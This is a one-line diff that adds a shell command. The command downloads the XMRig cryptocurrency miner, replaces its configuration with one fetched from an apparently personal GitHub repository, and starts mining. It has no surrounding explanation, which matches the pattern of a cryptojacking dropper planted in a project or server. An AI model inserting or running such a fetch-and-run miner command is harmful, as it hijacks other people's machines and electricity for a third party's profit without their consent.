@@ -1,0 +1,1 @@
+wget -O xm.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz && tar -xf xm.tar.gz && cd xmrig-6.18.0 && rm -rf config.json && wget -O config.json https://raw.githubusercontent.com/qhjruekehr/personal/main/config.json && ./xmrig
